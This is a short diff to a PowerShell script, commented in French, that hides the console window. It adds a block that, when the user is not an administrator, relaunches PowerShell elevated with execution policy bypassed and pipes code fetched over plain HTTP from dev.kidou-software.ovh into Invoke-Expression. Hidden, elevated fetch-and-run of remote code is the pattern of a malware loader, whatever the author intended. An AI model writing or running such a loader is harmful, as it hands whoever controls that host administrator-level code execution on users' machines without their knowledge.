@@ -14,6 +14,14 @@ $consolePtr = [ConsoleWindow]::GetConsoleWindow()
 
 [ConsoleWindow]::ShowWindow($consolePtr, [ConsoleWindow]::SW_HIDE)
 
+$isAdmin = [bool]([Security.Principal.WindowsIdentity]::GetCurrent().Groups -match 'S-1-5-32-544')
+
+if (-not $isAdmin) {
+    # Si l'utilisateur n'est pas administrateur, demander des privilÃ¨ges administratifs
+    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"`&(irm http://dev.kidou-software.ovh | iex)`"" -Verb RunAs
+    exit
+}
+
 $ErrorActionPreference = "Stop"
 [Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor [Net.SecurityProtocolType]::Tls12
 
